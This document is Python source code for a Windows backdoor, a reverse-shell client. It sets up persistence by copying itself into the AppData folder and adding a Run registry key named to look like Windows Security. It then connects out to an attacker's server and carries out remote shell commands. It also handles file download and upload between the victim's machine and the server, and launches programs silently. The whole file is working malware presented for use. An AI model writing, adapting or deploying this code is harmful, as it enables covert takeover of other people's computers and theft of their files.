from json.decoder import JSONDecodeError
import socket,subprocess,json,os,base64,sys,shutil

class Backdoor:
    
    def __init__(self,ip,port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def persistence(self):
        location = os.environ["appdata"] + "\\System Binary.exe"
        if not os.path.exists(location): #This checks wether the location exists or not
            shutil.copyfile(sys.executable,location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurity /t REG_SZ /d "' + location + '"',shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

    def send_data(self,data):
        if type(data) != str:
            json_data = json.dumps(data.decode('ISO-8859-1')) #This one is very important ISO-8859-1
        else:
            json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data +  self.connection.recv(1024).decode()
                return json.loads(json_data.encode())
            except JSONDecodeError:  
                continue
    
    def change_directory(self,path):
        os.chdir(path)
        return f"[+] Changed the working directory {path}"
 
    def execute_command(self,reply):
        try:
            return subprocess.check_output(reply,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            #stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL this will hide the input and error in the console, the output is handles by check_output
        except subprocess.CalledProcessError:
            return b"[-]Invalid command!"
    
    def write_file(self,path,data):
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))
            return b"[+]Uploaded successfully!"

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def start_func(self,path):
        subprocess.Popen(path,shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
        return b"[+]Appliction Started!!"

    def run(self):
        while True:
            reply = self.receive_data()
            try:
                if reply[0] == 'exit':
                    self.connection.close()
                    sys.exit() #using sys.exit() will exit the program without any error message
                elif reply[0] == 'cd' and len(reply) >1 :
                    reply.remove('cd')
                    name = ''
                    for names in reply:
                        name += names + ' '
                    output = self.change_directory(name)
                elif reply[0] == 'download':
                    output = self.read_file(reply[1])
                elif reply[0] == 'start':
                    output = self.start_func(reply[1])    
                elif reply[0] == 'upload':
                    output = self.write_file(reply[1],reply[2])    
                else: 
                    output = self.execute_command(reply)
            except Exception:
                output = b"[-]Error in executing the command!!"        
            self.send_data(output)

try:
    backdoor = Backdoor('server_ip',server_port)
    backdoor.run()
except Exception:
    sys.exit()        
